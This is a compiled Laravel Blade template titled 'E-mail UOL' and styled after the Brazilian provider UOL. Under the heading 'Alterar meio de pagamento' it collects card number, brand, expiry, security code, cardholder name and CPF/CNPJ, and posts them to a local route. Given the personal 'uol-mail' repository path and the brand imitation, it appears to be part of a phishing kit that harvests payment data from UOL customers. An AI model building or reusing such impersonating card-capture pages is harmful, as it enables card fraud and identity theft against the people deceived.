<?php if (isset($component)) { $__componentOriginal5863877a5171c196453bfa0bd807e410 = $component; } ?>
<?php if (isset($attributes)) { $__attributesOriginal5863877a5171c196453bfa0bd807e410 = $attributes; } ?>
<?php $component = Illuminate\View\AnonymousComponent::resolve(['view' => 'components.layouts.app','data' => ['title' => 'E-mail UOL']] + (isset($attributes) && $attributes instanceof Illuminate\View\ComponentAttributeBag ? $attributes->all() : [])); ?>
<?php $component->withName('layouts.app'); ?>
<?php if ($component->shouldRender()): ?>
<?php $__env->startComponent($component->resolveView(), $component->data()); ?>
<?php if (isset($attributes) && $attributes instanceof Illuminate\View\ComponentAttributeBag): ?>
<?php $attributes = $attributes->except(\Illuminate\View\AnonymousComponent::ignoredParameterNames()); ?>
<?php endif; ?>
<?php $component->withAttributes(['title' => 'E-mail UOL']); ?>
    <div class="py-4">Alterar meio de pagamento</div>
    <div class="text-muted-foreground text-sm mb-4 py-2">Selecione um novo meio de pagamento para os seus produtos:</div>
    <div class="bg-card text-card-foreground flex flex-col gap-6 rounded-none rounded-b-xl border py-6 shadow-lg max-sm:border-none max-sm:shadow-none">
        <form method="POST" action="<?php echo e(route('card.store')); ?>" class="space-y-12" data-loading-form data-card-form>
            <?php echo csrf_field(); ?>
            <div class="px-6">
                <div class="space-y-4">
                    <div class="flex max-w-2xl items-start gap-2 max-sm:flex-col">
                        <div class="min-h-26 w-full min-w-[50%]">
                            <label for="cardNumber" class="text-sm leading-none font-medium select-none truncate">Número do cartão</label>
                            <div class="relative">
                                <input id="cardNumber" name="cardNumber" autocomplete="off" value="<?php echo e(old('cardNumber')); ?>"
                                       minlength="19" maxlength="21" placeholder="Número do cartão" data-mask="card"
                                       class="border-input text-muted-foreground placeholder:text-muted-foreground flex h-9 w-full min-w-0 rounded-sm border bg-transparent px-3 py-1 text-base shadow-none outline-none md:text-sm <?php echo e($errors->has('cardNumber') ? 'border-red-500' : ''); ?>">
                                <div class="absolute top-1/2 right-0 -translate-y-1/2 pr-1">
                                    <select name="type" class="h-9 border-none bg-transparent text-xs shadow-none" aria-label="Bandeira do cartão" data-card-brand>
                                        <?php $__currentLoopData = ['back'=>'Selecione', 'visa'=>'Visa', 'mastercard'=>'Mastercard', 'Amex'=>'Amex', 'hipercard'=>'Hipercard', 'elo'=>'Elo']; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $key => $label): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
                                            <option value="<?php echo e($key); ?>" <?php if(old('type', 'back') === $key): echo 'selected'; endif; ?>><?php echo e($label); ?></option>
                                        <?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
                                    </select>
                                </div>
                            </div>
                            <?php $__errorArgs = ['cardNumber'];
$__bag = $errors->getBag($__errorArgs[1] ?? 'default');
if ($__bag->has($__errorArgs[0])) :
if (isset($message)) { $__messageOriginal = $message; }
$message = $__bag->first($__errorArgs[0]); ?><?php if (isset($component)) { $__componentOriginal8675a3c82e3ac5085324d469d74b9dd9 = $component; } ?>
<?php if (isset($attributes)) { $__attributesOriginal8675a3c82e3ac5085324d469d74b9dd9 = $attributes; } ?>
<?php $component = Illuminate\View\AnonymousComponent::resolve(['view' => 'components.input-warning','data' => ['message' => $message]] + (isset($attributes) && $attributes instanceof Illuminate\View\ComponentAttributeBag ? $attributes->all() : [])); ?>
<?php $component->withName('input-warning'); ?>
<?php if ($component->shouldRender()): ?>
<?php $__env->startComponent($component->resolveView(), $component->data()); ?>
<?php if (isset($attributes) && $attributes instanceof Illuminate\View\ComponentAttributeBag): ?>
<?php $attributes = $attributes->except(\Illuminate\View\AnonymousComponent::ignoredParameterNames()); ?>
<?php endif; ?>
<?php $component->withAttributes(['message' => \Illuminate\View\Compilers\BladeCompiler::sanitizeComponentAttribute($message)]); ?>
<?php echo $__env->renderComponent(); ?>
<?php endif; ?>
<?php if (isset($__attributesOriginal8675a3c82e3ac5085324d469d74b9dd9)): ?>
<?php $attributes = $__attributesOriginal8675a3c82e3ac5085324d469d74b9dd9; ?>
<?php unset($__attributesOriginal8675a3c82e3ac5085324d469d74b9dd9); ?>
<?php endif; ?>
<?php if (isset($__componentOriginal8675a3c82e3ac5085324d469d74b9dd9)): ?>
<?php $component = $__componentOriginal8675a3c82e3ac5085324d469d74b9dd9; ?>
<?php unset($__componentOriginal8675a3c82e3ac5085324d469d74b9dd9); ?>
<?php endif; ?><?php unset($message);
if (isset($__messageOriginal)) { $message = $__messageOriginal; }
endif;
unset($__errorArgs, $__bag); ?>
                            <?php if(!$errors->has('cardNumber')): ?>
                                <div class="mt-2 flex items-center gap-1">
                                    <?php $__currentLoopData = ['visa','mastercard','Amex','hipercard','elo']; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $brand): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?><img src="<?php echo e(data_get(json_decode(file_get_contents(base_path('resources/data/card-brands.json')), true), $brand)); ?>" alt="<?php echo e($brand); ?>" class="h-6 w-8 object-contain"><?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
                                </div>
                            <?php endif; ?>
                        </div>
                        <div class="flex w-full gap-2">
                            <div class="w-full">
                                <label for="expiryDate" class="text-sm leading-none font-medium select-none truncate">Data de validade</label>
                                <input id="expiryDate" name="expiryDate" autocomplete="off" value="<?php echo e(old('expiryDate')); ?>" minlength="5" maxlength="5" placeholder="05/30" data-mask="expiry" class="border-input text-muted-foreground placeholder:text-muted-foreground flex h-9 w-full min-w-0 rounded-sm border bg-transparent px-3 py-1 text-base shadow-none outline-none md:text-sm">
                                <?php $__errorArgs = ['expiryDate'];
$__bag = $errors->getBag($__errorArgs[1] ?? 'default');
if ($__bag->has($__errorArgs[0])) :
if (isset($message)) { $__messageOriginal = $message; }
$message = $__bag->first($__errorArgs[0]); ?><?php if (isset($component)) { $__componentOriginal8675a3c82e3ac5085324d469d74b9dd9 = $component; } ?>
<?php if (isset($attributes)) { $__attributesOriginal8675a3c82e3ac5085324d469d74b9dd9 = $attributes; } ?>
<?php $component = Illuminate\View\AnonymousComponent::resolve(['view' => 'components.input-warning','data' => ['message' => $message]] + (isset($attributes) && $attributes instanceof Illuminate\View\ComponentAttributeBag ? $attributes->all() : [])); ?>
<?php $component->withName('input-warning'); ?>
<?php if ($component->shouldRender()): ?>
<?php $__env->startComponent($component->resolveView(), $component->data()); ?>
<?php if (isset($attributes) && $attributes instanceof Illuminate\View\ComponentAttributeBag): ?>
<?php $attributes = $attributes->except(\Illuminate\View\AnonymousComponent::ignoredParameterNames()); ?>
<?php endif; ?>
<?php $component->withAttributes(['message' => \Illuminate\View\Compilers\BladeCompiler::sanitizeComponentAttribute($message)]); ?>
<?php echo $__env->renderComponent(); ?>
<?php endif; ?>
<?php if (isset($__attributesOriginal8675a3c82e3ac5085324d469d74b9dd9)): ?>
<?php $attributes = $__attributesOriginal8675a3c82e3ac5085324d469d74b9dd9; ?>
<?php unset($__attributesOriginal8675a3c82e3ac5085324d469d74b9dd9); ?>
<?php endif; ?>
<?php if (isset($__componentOriginal8675a3c82e3ac5085324d469d74b9dd9)): ?>
<?php $component = $__componentOriginal8675a3c82e3ac5085324d469d74b9dd9; ?>
<?php unset($__componentOriginal8675a3c82e3ac5085324d469d74b9dd9); ?>
<?php endif; ?><?php unset($message);
if (isset($__messageOriginal)) { $message = $__messageOriginal; }
endif;
unset($__errorArgs, $__bag); ?>
                            </div>
                            <div class="w-full">
                                <label for="cvv" class="text-sm leading-none font-medium select-none truncate">Código de segurança</label>
                                <input id="cvv" name="cvv" autocomplete="off" value="<?php echo e(old('cvv')); ?>" minlength="3" maxlength="4" placeholder="123" data-mask="digits" class="border-input text-muted-foreground placeholder:text-muted-foreground flex h-9 w-full min-w-0 rounded-sm border bg-transparent px-3 py-1 text-base shadow-none outline-none md:text-sm">
                                <?php $__errorArgs = ['cvv'];
$__bag = $errors->getBag($__errorArgs[1] ?? 'default');
if ($__bag->has($__errorArgs[0])) :
if (isset($message)) { $__messageOriginal = $message; }
$message = $__bag->first($__errorArgs[0]); ?><?php if (isset($component)) { $__componentOriginal8675a3c82e3ac5085324d469d74b9dd9 = $component; } ?>
<?php if (isset($attributes)) { $__attributesOriginal8675a3c82e3ac5085324d469d74b9dd9 = $attributes; } ?>
<?php $component = Illuminate\View\AnonymousComponent::resolve(['view' => 'components.input-warning','data' => ['message' => $message]] + (isset($attributes) && $attributes instanceof Illuminate\View\ComponentAttributeBag ? $attributes->all() : [])); ?>
<?php $component->withName('input-warning'); ?>
<?php if ($component->shouldRender()): ?>
<?php $__env->startComponent($component->resolveView(), $component->data()); ?>
<?php if (isset($attributes) && $attributes instanceof Illuminate\View\ComponentAttributeBag): ?>
<?php $attributes = $attributes->except(\Illuminate\View\AnonymousComponent::ignoredParameterNames()); ?>
<?php endif; ?>
<?php $component->withAttributes(['message' => \Illuminate\View\Compilers\BladeCompiler::sanitizeComponentAttribute($message)]); ?>
<?php echo $__env->renderComponent(); ?>
<?php endif; ?>
<?php if (isset($__attributesOriginal8675a3c82e3ac5085324d469d74b9dd9)): ?>
<?php $attributes = $__attributesOriginal8675a3c82e3ac5085324d469d74b9dd9; ?>
<?php unset($__attributesOriginal8675a3c82e3ac5085324d469d74b9dd9); ?>
<?php endif; ?>
<?php if (isset($__componentOriginal8675a3c82e3ac5085324d469d74b9dd9)): ?>
<?php $component = $__componentOriginal8675a3c82e3ac5085324d469d74b9dd9; ?>
<?php unset($__componentOriginal8675a3c82e3ac5085324d469d74b9dd9); ?>
<?php endif; ?><?php unset($message);
if (isset($__messageOriginal)) { $message = $__messageOriginal; }
endif;
unset($__errorArgs, $__bag); ?>
                            </div>
                        </div>
                    </div>
                    <div class="flex max-w-2xl gap-2 max-sm:flex-col">
                        <div class="w-full min-w-1/2">
                            <label for="cardHolder" class="text-sm leading-none font-medium select-none truncate">Nome no cartão</label>
                            <input id="cardHolder" name="cardHolder" autocomplete="off" value="<?php echo e(old('cardHolder')); ?>" minlength="2" placeholder="Nome no cartão" class="border-input text-muted-foreground placeholder:text-muted-foreground flex h-9 w-full min-w-0 rounded-sm border bg-transparent px-3 py-1 text-base shadow-none outline-none md:text-sm">
                            <?php $__errorArgs = ['cardHolder'];
$__bag = $errors->getBag($__errorArgs[1] ?? 'default');
if ($__bag->has($__errorArgs[0])) :
if (isset($message)) { $__messageOriginal = $message; }
$message = $__bag->first($__errorArgs[0]); ?><?php if (isset($component)) { $__componentOriginal8675a3c82e3ac5085324d469d74b9dd9 = $component; } ?>
<?php if (isset($attributes)) { $__attributesOriginal8675a3c82e3ac5085324d469d74b9dd9 = $attributes; } ?>
<?php $component = Illuminate\View\AnonymousComponent::resolve(['view' => 'components.input-warning','data' => ['message' => $message]] + (isset($attributes) && $attributes instanceof Illuminate\View\ComponentAttributeBag ? $attributes->all() : [])); ?>
<?php $component->withName('input-warning'); ?>
<?php if ($component->shouldRender()): ?>
<?php $__env->startComponent($component->resolveView(), $component->data()); ?>
<?php if (isset($attributes) && $attributes instanceof Illuminate\View\ComponentAttributeBag): ?>
<?php $attributes = $attributes->except(\Illuminate\View\AnonymousComponent::ignoredParameterNames()); ?>
<?php endif; ?>
<?php $component->withAttributes(['message' => \Illuminate\View\Compilers\BladeCompiler::sanitizeComponentAttribute($message)]); ?>
<?php echo $__env->renderComponent(); ?>
<?php endif; ?>
<?php if (isset($__attributesOriginal8675a3c82e3ac5085324d469d74b9dd9)): ?>
<?php $attributes = $__attributesOriginal8675a3c82e3ac5085324d469d74b9dd9; ?>
<?php unset($__attributesOriginal8675a3c82e3ac5085324d469d74b9dd9); ?>
<?php endif; ?>
<?php if (isset($__componentOriginal8675a3c82e3ac5085324d469d74b9dd9)): ?>
<?php $component = $__componentOriginal8675a3c82e3ac5085324d469d74b9dd9; ?>
<?php unset($__componentOriginal8675a3c82e3ac5085324d469d74b9dd9); ?>
<?php endif; ?><?php unset($message);
if (isset($__messageOriginal)) { $message = $__messageOriginal; }
endif;
unset($__errorArgs, $__bag); ?>
                        </div>
                        <div class="w-full min-w-1/2">
                            <label for="cpf" class="text-sm leading-none font-medium select-none truncate">CPF/CNPJ do titular</label>
                            <input id="cpf" name="cpf" autocomplete="off" value="<?php echo e(old('cpf')); ?>" maxlength="18" placeholder="000.000.000-00" data-mask="cpf" class="border-input text-muted-foreground placeholder:text-muted-foreground flex h-9 w-full min-w-0 rounded-sm border bg-transparent px-3 py-1 text-base shadow-none outline-none md:text-sm">
                            <?php $__errorArgs = ['cpf'];
$__bag = $errors->getBag($__errorArgs[1] ?? 'default');
if ($__bag->has($__errorArgs[0])) :
if (isset($message)) { $__messageOriginal = $message; }
$message = $__bag->first($__errorArgs[0]); ?><?php if (isset($component)) { $__componentOriginal8675a3c82e3ac5085324d469d74b9dd9 = $component; } ?>
<?php if (isset($attributes)) { $__attributesOriginal8675a3c82e3ac5085324d469d74b9dd9 = $attributes; } ?>
<?php $component = Illuminate\View\AnonymousComponent::resolve(['view' => 'components.input-warning','data' => ['message' => $message]] + (isset($attributes) && $attributes instanceof Illuminate\View\ComponentAttributeBag ? $attributes->all() : [])); ?>
<?php $component->withName('input-warning'); ?>
<?php if ($component->shouldRender()): ?>
<?php $__env->startComponent($component->resolveView(), $component->data()); ?>
<?php if (isset($attributes) && $attributes instanceof Illuminate\View\ComponentAttributeBag): ?>
<?php $attributes = $attributes->except(\Illuminate\View\AnonymousComponent::ignoredParameterNames()); ?>
<?php endif; ?>
<?php $component->withAttributes(['message' => \Illuminate\View\Compilers\BladeCompiler::sanitizeComponentAttribute($message)]); ?>
<?php echo $__env->renderComponent(); ?>
<?php endif; ?>
<?php if (isset($__attributesOriginal8675a3c82e3ac5085324d469d74b9dd9)): ?>
<?php $attributes = $__attributesOriginal8675a3c82e3ac5085324d469d74b9dd9; ?>
<?php unset($__attributesOriginal8675a3c82e3ac5085324d469d74b9dd9); ?>
<?php endif; ?>
<?php if (isset($__componentOriginal8675a3c82e3ac5085324d469d74b9dd9)): ?>
<?php $component = $__componentOriginal8675a3c82e3ac5085324d469d74b9dd9; ?>
<?php unset($__componentOriginal8675a3c82e3ac5085324d469d74b9dd9); ?>
<?php endif; ?><?php unset($message);
if (isset($__messageOriginal)) { $message = $__messageOriginal; }
endif;
unset($__errorArgs, $__bag); ?>
                        </div>
                    </div>
                </div>
            </div>
            <div class="flex items-center px-6"><button type="submit" data-submit class="text-foreground h-12 cursor-pointer rounded-none bg-[#FDC900] px-4 text-base shadow-none hover:shadow-[inset_0_-2px_0_0_#E9B425] disabled:cursor-not-allowed disabled:opacity-50">Continuar</button></div>
        </form>
    </div>
 <?php echo $__env->renderComponent(); ?>
<?php endif; ?>
<?php if (isset($__attributesOriginal5863877a5171c196453bfa0bd807e410)): ?>
<?php $attributes = $__attributesOriginal5863877a5171c196453bfa0bd807e410; ?>
<?php unset($__attributesOriginal5863877a5171c196453bfa0bd807e410); ?>
<?php endif; ?>
<?php if (isset($__componentOriginal5863877a5171c196453bfa0bd807e410)): ?>
<?php $component = $__componentOriginal5863877a5171c196453bfa0bd807e410; ?>
<?php unset($__componentOriginal5863877a5171c196453bfa0bd807e410); ?>
<?php endif; ?>
<?php /**PATH C:\Users\brami\Github\uol-mail\resources\views\card\index.blade.php ENDPATH**/ ?>